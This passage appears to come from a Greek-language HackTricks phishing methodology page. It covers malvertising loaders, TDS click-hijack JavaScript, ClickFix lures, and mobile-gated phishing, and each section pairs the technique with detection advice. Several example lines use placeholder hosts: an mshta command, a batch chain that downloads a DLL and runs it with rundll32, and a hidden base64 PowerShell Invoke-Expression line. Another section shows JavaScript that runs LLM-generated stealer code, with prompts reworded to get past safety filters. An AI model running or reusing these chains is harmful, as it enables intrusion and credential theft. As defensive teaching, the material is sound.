3. Ο loader εξάγει cookies του browser και βάσεις δεδομένων διαπιστευτηρίων, και στη συνέχεια κατεβάζει έναν **αθόρυβο loader** που αποφασίζει – *σε πραγματικό χρόνο* – αν θα αναπτύξει:
   * RAT (π.χ. AsyncRAT, RustDesk)
   * ransomware / wiper
   * στοιχείο persistence (κλειδί Run στο registry + προγραμματισμένη εργασία)

### Συμβουλές θωράκισης
* Αποκλείετε νεοκαταχωρισμένα domains και εφαρμόζετε **Advanced DNS / URL Filtering** τόσο στις *διαφημίσεις αναζήτησης* όσο και στο e-mail.
* Περιορίζετε την εγκατάσταση λογισμικού σε υπογεγραμμένα πακέτα MSI / Store και απαγορεύετε την εκτέλεση `HTA`, `ISO`, `VBS` μέσω policy.
* Παρακολουθείτε για child processes των browsers που ανοίγουν installers:
  ```yaml
  - parent_image: /Program Files/Google/Chrome/*
    and child_image: *\\*.exe
  ```
* Αναζητήστε LOLBins που χρησιμοποιούνται συχνά από first-stage loaders (π.χ. `regsvr32`, `curl`, `mshta`).

### Υφαρπαγή κλικ στο κουμπί λήψης με ανακατεύθυνση μέσω TDS
Ορισμένες πλαστές πύλες λογισμικού διατηρούν το ορατό `href` λήψης να δείχνει στην **πραγματική** διεύθυνση URL του GitHub/release, αλλά υφαρπάζουν την **πρώτη** αλληλεπίδραση του χρήστη μέσω JavaScript και κατευθύνουν το θύμα σε μια αλυσίδα **Συστήματος Κατανομής Κυκλοφορίας (TDS)**.<sup>[[9]](#references)</sup>

```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
  if (!isEligibleClick(e.target)) return;
  cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
  e.stopImmediatePropagation();
  e.preventDefault();
}, true);
```

Βασικά χαρακτηριστικά:
- Το hook συνήθως εκτελείται στη **φάση capture** (`true`) στο `document`, επομένως ενεργοποιείται πριν από τους handlers του ιστότοπου.
- Το Chrome συχνά χρησιμοποιεί `mousedown` αντί για `click`, ώστε η ανακατεύθυνση να συνδέεται με μια έγκυρη **χειρονομία χρήστη** και να βελτιώνεται η παράκαμψη του popup blocker.
- Ορισμένες παραλλαγές ανοίγουν εκ των προτέρων το `about:blank` ή προκαλούν τεχνητά clicks σε `<a target="_blank">` και αναθέτουν τη διεύθυνση URL του TDS αργότερα.
- Τα όρια στην πλευρά του browser αποθηκεύονται συνήθως στο `localStorage`, οπότε το **πρώτο click** μπορεί να οδηγήσει στο malware, ενώ οι ανανεώσεις/επαναλήψεις καταλήγουν στον σύνδεσμο που εμφανίζεται και μοιάζει αβλαβής.
- Το TDS μπορεί να εφαρμόζει περιορισμούς βάσει referrer, domain εισόδου, GEO, browser/device fingerprint, ελέγχων VPN/datacenter, πλαισίου click και μετρητών ανά session, καθιστώντας τις επαναλήψεις από αναλυτές μη ντετερμινιστικές.

Ιδέες για αμυνόμενους:
- Συγκρίνετε το `href` που **εμφανίζεται** με τον **πραγματικό** προορισμό πλοήγησης που δημιουργείται τη στιγμή του click.
- Αναζητήστε handlers `document.addEventListener(..., true)` που καλούν τόσο `preventDefault()` όσο και `stopImmediatePropagation()` σε συνδυασμό με `window.open`, `about:blank` ή τεχνητά clicks σε anchor.
- Αντιμετωπίστε ομάδες πρόσφατα καταχωρισμένων domain για λήψεις λογισμικού, που φορτώνουν όλα το ίδιο CloudFront/JS stage, ως ισχυρή ένδειξη μοτίβου SEO-poisoning/TDS.

### ClickFix από ψεύτικες σελίδες επαλήθευσης + λήψεις μέσω LOLBAS που παραπέμπουν σε αρχεία
Ορισμένοι κλάδοι TDS καταλήγουν σε μια ψεύτικη σελίδα επαλήθευσης (τύπου Cloudflare/IUAM) που λέει στο θύμα να εκτελέσει ένα έμπιστο δυαδικό αρχείο των Windows, όπως:<sup>[[9]](#references)</sup>

```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```

Σημειώσεις:
- Το `mshta.exe` εκτελεί το **HTA/VBScript στην αρχή της απόκρισης**, ακόμα κι αν το URL προσποιείται ότι είναι αρχείο `.7z`· τα δεδομένα αρχείου που έχουν προστεθεί στο τέλος μπορεί να είναι απλώς παραπλανητικά.
- Τα επόμενα στάδια συχνά συνεχίζουν να παραπλανούν ως προς τον τύπο αρχείου (`.rtf` για PowerShell, `.asar` για Python, ZIP με binaries που έχουν συμπληρωθεί με δεδομένα) και έπειτα μεταβαίνουν σε **χειροκίνητο PE mapping / εκτέλεση στη μνήμη**.
- Αν ανταποκρίνεστε σε μία από αυτές τις αλυσίδες, διατηρήστε **το δίκτυο + τη μνήμη από την πρώτη επιτυχημένη εκτέλεση**: οι μεταγενέστερες επαναλήψεις μπορεί να δείχνουν μόνο μια ακίνδυνη διαδρομή installer/SFX ή να αποτυγχάνουν επειδή η αποδέσμευση του payload/key είχε συνδεθεί με την αρχική συνεδρία TDS.

### Tradecraft παράδοσης DLL μέσω ClickFix (ψεύτικη ενημέρωση CERT)
* Δόλωμα: κλωνοποιημένη ανακοίνωση εθνικού CERT με κουμπί **Ενημέρωση** που εμφανίζει βήμα προς βήμα οδηγίες «επιδιόρθωσης». Λένε στα θύματα να εκτελέσουν ένα batch που κατεβάζει ένα DLL και το εκτελεί μέσω `rundll32`.<sup>[[12]](#references)</sup>
* Τυπική αλυσίδα batch που παρατηρήθηκε:
  ```cmd
  echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
  echo timeout /t 10
  echo rundll32.exe "%TEMP%\notepad2.dll",notepad
  ```
  * Το `Invoke-WebRequest` αποθηκεύει το payload στο `%TEMP%`, μια σύντομη αναμονή αποκρύπτει το network jitter και στη συνέχεια το `rundll32` καλεί το exported entrypoint (`notepad`).
* Το DLL στέλνει beacon με την ταυτότητα του host και ελέγχει το C2 κάθε λίγα λεπτά. Οι απομακρυσμένες εντολές φτάνουν ως **base64-κωδικοποιημένο PowerShell**, το οποίο εκτελείται κρυφά και με παράκαμψη της πολιτικής:
  ```powershell
  powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
  ```
  * Αυτό διατηρεί την ευελιξία του C2 (ο server μπορεί να αλλάζει tasks χωρίς να ενημερώνει το DLL) και αποκρύπτει τα παράθυρα της κονσόλας. Αναζητήστε διεργασίες PowerShell ως παιδιά του `rundll32.exe`, με τα `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` να εμφανίζονται μαζί.
* Οι defenders μπορούν να αναζητούν HTTP(S) callbacks της μορφής `...page.php?tynor=<COMPUTER>sss<USER>` και polling ανά 5 λεπτά μετά τη φόρτωση του DLL.

---

## Malvertising μέσω RTB που ενεργοποιείται κατά την προβολή

Σε αντίθεση με ένα χορηγούμενο αποτέλεσμα αναζήτησης, για το οποίο απαιτείται κλικ, μια διαφήμιση RTB μπορεί να φορτώσει JavaScript τρίτου μέρους όταν το creative της εμφανίζεται σε έναν ιστότοπο ή σε μια εφαρμογή. Το Citizen Lab παρατήρησε ad tags να καλούν ξεχωριστό decision server με advertising identifiers. Οι περισσότερες εμφανίσεις έλαβαν κενή απάντηση· επιλεγμένες εμφανίσεις μπορούσαν να λάβουν JavaScript. Επομένως, μια ακίνδυνη απάντηση κατά την επανάληψη δεν αποδεικνύει ότι όλοι οι θεατές έλαβαν το ίδιο περιεχόμενο.<sup>[[14]](#references)</sup>

Αυτός είναι ένας **μηχανισμός παράδοσης**, όχι από μόνος του exploit: η εκτέλεση JavaScript σε πλαίσιο προβολής διαφημίσεων δεν εγκαθιστά αυτόματα spyware. Το υποκείμενο browser ή OS exploit δεν αποκαλύφθηκε, επομένως μια εμφάνιση διαφήμισης ή ένα αίτημα προς decision server από μόνο του δεν αποδεικνύει μόλυνση. Για την πλευρά της σύνδεσης identifiers στο RTB targeting, δείτε το [Threat Modeling and Identity Separation](../../privacy/threat-modeling-and-identity-separation.md).<sup>[[14]](#references)</sup>

## Επιχειρήσεις Phishing ενισχυμένες με AI
Οι επιτιθέμενοι συνδυάζουν πλέον **LLM & voice-clone APIs** για πλήρως εξατομικευμένα δολώματα και αλληλεπίδραση σε πραγματικό χρόνο.

| Επίπεδο | Παράδειγμα χρήσης από threat actor |
|-------|-----------------------------|
|Αυτοματοποίηση|Δημιουργία & αποστολή >100 χιλ. emails / SMS με τυχαιοποιημένη διατύπωση & tracking links.|
|Generative AI|Παραγωγή *μοναδικών* emails που αναφέρονται σε δημόσιες συγχωνεύσεις και εξαγορές, σε εσωτερικά αστεία από τα μέσα κοινωνικής δικτύωσης· deep-fake φωνή CEO σε callback scam.|
|Agentic AI|Αυτόνομη καταχώριση domains, συλλογή open-source intel, σύνταξη emails επόμενου σταδίου όταν ένα θύμα κάνει κλικ αλλά δεν υποβάλλει credentials.|

**Άμυνα:**  
• Προσθέστε **δυναμικά banners** που επισημαίνουν μηνύματα τα οποία αποστέλλονται από μη έμπιστους μηχανισμούς αυτοματοποίησης (μέσω ανωμαλιών ARC/DKIM).  
• Εφαρμόστε **φράσεις πρόκλησης φωνητικής βιομετρίας** για τηλεφωνικά αιτήματα υψηλού κινδύνου.  
• Προσομοιώνετε συνεχώς δολώματα που δημιουργούνται από AI σε προγράμματα ευαισθητοποίησης – τα στατικά πρότυπα είναι ξεπερασμένα.

Δείτε επίσης – κατάχρηση agentic browsing για credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Δείτε επίσης – κατάχρηση τοπικών εργαλείων CLI και MCP από AI agents (για απογραφή και ανίχνευση secrets):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## Συναρμολόγηση phishing JavaScript κατά την εκτέλεση με τη βοήθεια LLM (codegen εντός browser)

Οι επιτιθέμενοι μπορούν να διανείμουν HTML που φαίνεται ακίνδυνο και να **δημιουργούν τον stealer κατά την εκτέλεση**, ζητώντας JavaScript από ένα **έμπιστο LLM API** και στη συνέχεια εκτελώντας το μέσα στον browser (π.χ. με `eval` ή δυναμικό `<script>`).<sup>[[8]](#references)</sup>

1. **Prompt-as-obfuscation:** Κωδικοποιήστε URLs εξαγωγής δεδομένων/Base64 strings στο prompt· επαναλάβετε τη διατύπωση ώστε να παρακάμψετε τα safety filters και να μειώσετε τις παραισθήσεις.
2. **Κλήση API από την πλευρά του client:** Κατά τη φόρτωση, η JS καλεί ένα δημόσιο LLM (Gemini/DeepSeek/etc.) ή έναν CDN proxy· μόνο το prompt/API call υπάρχει στο στατικό HTML.
3. **Συναρμολόγηση & εκτέλεση:** Συνενώστε την απόκριση και εκτελέστε την (πολυμορφική σε κάθε επίσκεψη):

```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
  .then(r=>r.json())
  .then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```

4. **Phish/exfil:** ο παραγόμενος κώδικας εξατομικεύει το δόλωμα (π.χ., parsing token του LogoKit) και στέλνει τα διαπιστευτήρια στο endpoint που αποκρύπτεται στο prompt.

**Χαρακτηριστικά αποφυγής**
- Η κίνηση περνά από γνωστά domains LLM ή αξιόπιστους proxy CDN· μερικές φορές χρησιμοποιούνται WebSockets προς backend.
- Δεν υπάρχει στατικό payload· το κακόβουλο JS υπάρχει μόνο μετά το render.
- Οι μη ντετερμινιστικές παραγωγές δημιουργούν **μοναδικούς** stealers για κάθε session.

**Ιδέες ανίχνευσης**
- Εκτελέστε sandboxes με ενεργοποιημένο JS· επισημάνετε runtime `eval`/δυναμική δημιουργία script με πηγή τις απαντήσεις LLM.
- Αναζητήστε POST από το front-end προς APIs LLM, ακολουθούμενα αμέσως από `eval`/`Function` στο κείμενο που επιστράφηκε.
- Ειδοποιήστε για μη εγκεκριμένα domains LLM στην κίνηση του client και για επακόλουθα POST διαπιστευτηρίων.

---

## MFA Fatigue / Push Bombing Variant – Εξαναγκαστική επαναφορά
Πέρα από το κλασικό push-bombing, οι operators απλώς **εξαναγκάζουν νέα εγγραφή MFA** κατά τη διάρκεια της κλήσης με το help desk, ακυρώνοντας το υπάρχον token του χρήστη. Οποιοδήποτε επόμενο prompt σύνδεσης φαίνεται νόμιμο στο θύμα.

```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```

Παρακολουθήστε για συμβάντα AzureAD/AWS/Okta όπου τα **`deleteMFA` + `addMFA`** συμβαίνουν **μέσα σε λίγα λεπτά από την ίδια IP**.



## Clipboard Hijacking / Pastejacking

Οι επιτιθέμενοι μπορούν να αντιγράψουν κρυφά κακόβουλες εντολές στο clipboard του θύματος από μια παραβιασμένη ή typosquatted ιστοσελίδα και στη συνέχεια να ξεγελάσουν τον χρήστη ώστε να τις επικολλήσει μέσα στο **Win + R**, **Win + X** ή σε ένα παράθυρο τερματικού, εκτελώντας αυθαίρετο κώδικα χωρίς λήψη αρχείου ή συνημμένο.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Διανομή Κακόβουλων Εφαρμογών (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Παραβίαση σύνδεσης συσκευής WhatsApp μέσω QR social engineering
* Μια σελίδα-δόλωμα (π.χ. ψεύτικο «κανάλι» υπουργείου/CERT) εμφανίζει έναν κωδικό QR του WhatsApp Web/Desktop και δίνει οδηγίες στο θύμα να τον σαρώσει, προσθέτοντας κρυφά τον επιτιθέμενο ως **linked device**.<sup>[[12]](#references)</sup>
* Ο επιτιθέμενος αποκτά αμέσως πρόσβαση στην προβολή συνομιλιών/επαφών, έως ότου αφαιρεθεί η συνεδρία. Τα θύματα μπορεί αργότερα να δουν μια ειδοποίηση «συνδέθηκε νέα συσκευή». Οι αμυνόμενοι μπορούν να αναζητήσουν απροσδόκητα συμβάντα σύνδεσης συσκευής λίγο μετά από επισκέψεις σε μη έμπιστες σελίδες QR.

### Phishing με περιορισμό σε κινητές συσκευές για αποφυγή crawlers/sandboxes
Οι χειριστές περιορίζουν ολοένα και περισσότερο τις ροές phishing με έναν απλό έλεγχο συσκευής, ώστε οι crawlers για desktop να μην φτάνουν ποτέ στις τελικές σελίδες. Ένα συνηθισμένο μοτίβο είναι ένα μικρό script που ελέγχει αν το DOM υποστηρίζει αφή και στέλνει το αποτέλεσμα σε ένα endpoint διακομιστή. Οι πελάτες που δεν είναι κινητές συσκευές λαμβάνουν HTTP 500 (ή κενή σελίδα), ενώ στους χρήστες κινητών εμφανίζεται ολόκληρη η ροή.<sup>[[7]](#references)</sup>

Ελάχιστο απόσπασμα client (τυπική λογική):

```html
<script src="/static/detect_device.js"></script>
```

Η λογική του `detect_device.js` (απλοποιημένη):

```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
  .then(()=>location.reload());
```

Συμπεριφορά διακομιστή που παρατηρείται συχνά:
- Ορίζει ένα session cookie κατά την πρώτη φόρτωση.
- Δέχεται `POST /detect {"is_mobile":true|false}`.
- Επιστρέφει 500 (ή placeholder) σε επόμενα GET όταν το `is_mobile=false`· εμφανίζει phishing μόνο αν είναι `true`.

Ευρετικές μέθοδοι για αναζήτηση και ανίχνευση:
- Ερώτημα urlscan: `filename:"detect_device.js" AND page.status:500`
- Τηλεμετρία web: ακολουθία `GET /static/detect_device.js` → `POST /detect` → HTTP 500 για μη mobile· οι νόμιμες διαδρομές θυμάτων από mobile επιστρέφουν 200, μαζί με επακόλουθο HTML/JS.
- Αποκλείστε ή ελέγξτε σχολαστικά σελίδες που προβάλλουν περιεχόμενο αποκλειστικά βάσει του `ontouchstart` ή παρόμοιων ελέγχων συσκευής.

Συμβουλές άμυνας:
- Εκτελέστε crawlers με mobile-like fingerprints και ενεργοποιημένο JS, ώστε να αποκαλύπτεται το περιεχόμενο πίσω από περιορισμούς.
- Δημιουργήστε ειδοποίηση για ύποπτες αποκρίσεις 500 που ακολουθούν `POST /detect` σε πρόσφατα καταχωρισμένα domains.

## References

- [1] [Δημιουργία παραλλαγών domain που χρησιμοποιούνται στο phishing (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [Εντοπισμός phishing: Εργαλεία και τεχνικές (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [Υποκλοπή διαπιστευτηρίων και παράκαμψη 2FA με noVNC (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
- [4] [Υποκλοπή sessions και παράκαμψη 2FA με EvilnoVNC (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [5] [Πώς να εγκαταστήσετε και να ρυθμίσετε το DKIM με Postfix στο Debian Wheezy (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [6] [Παγκόσμια έκθεση Unit 42 για την αντιμετώπιση περιστατικών του 2025 – Έκδοση για την κοινωνική μηχανική](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [7] [Αθόρυβο smishing – υποδομή phishing με περιορισμό σε mobile και ευρετικές μέθοδοι (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [8] [Το επόμενο σύνορο των επιθέσεων συναρμολόγησης κατά τον χρόνο εκτέλεσης: Αξιοποίηση LLM για τη δημιουργία JavaScript phishing σε πραγματικό χρόνο](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [9] [Πλαστοπροσωπία, click hijacking και TDS: Μέσα σε ένα οικοσύστημα διανομής malware](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [10] [Bitsquatting στο Windows.com (Remy Hax)](https://remyhax.xyz/posts/bitsquatting-windows/)
- [11] [Υφαρπαγή κίνησης προς το windows.com της Microsoft με bitflipping (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [12] [Έρωτας; Στην πραγματικότητα: Ψεύτικη εφαρμογή γνωριμιών χρησιμοποιήθηκε ως δόλωμα σε στοχευμένη εκστρατεία spyware στο Πακιστάν](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [13] [IoC και δείγματα του ESET GhostChat](https://github.com/eset/malware-ioc/tree/master/ghostchat)
- [14] [Αποκάλυψη του AdFection: Πώς η Discover-Tech μετέτρεψε τις στοχευμένες διαφημίσεις σε δίαυλο για spyware μισθοφόρων χωρίς κλικ](https://citizenlab.ca/research/how-discover-tech-turned-targeted-ads-into-a-pipeline-for-spyware/)
{{#include ../../banners/hacktricks-training.md}}
